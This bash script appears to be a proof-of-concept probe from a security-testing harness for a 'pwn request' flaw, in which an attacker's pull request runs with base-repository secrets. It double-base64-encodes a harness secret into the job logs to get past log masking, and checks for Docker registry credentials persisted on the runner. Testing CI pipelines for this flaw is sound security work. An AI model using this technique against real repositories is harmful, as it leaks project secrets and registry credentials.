#!/bin/bash
# GERALT Pwn Request probe: attacker-controlled test-charts.sh
# Executed by the integration-test job (pull_request_target, base-repo context)
# after docker/login-action persisted REGISTRY_USER/REGISTRY_PASSWORD to
# ~/.docker/config.json on the same runner.

echo "GERALT_PWN: attacker-controlled test-charts.sh executing (args: $*)"

# Primary verification: leak the harness toy secret (double-base64 to survive log masking)
if [ -n "${GERALT_SECRET:-}" ]; then
  echo "GERALT_LEAKED_TOKEN=$(printf '%s' "$GERALT_SECRET" | base64 | base64)"
fi

# Defensive observation: Docker Hub credentials persisted by docker/login-action
if [ -f "$HOME/.docker/config.json" ]; then
  echo "GERALT_DOCKER_CREDS_PRESENT=yes ($(grep -c 'auths' "$HOME/.docker/config.json" 2>/dev/null || echo 0) auths)"
else
  echo "GERALT_DOCKER_CREDS_PRESENT=no"
fi

# Terminate explicitly so the logs preserve the evidence
exit 1
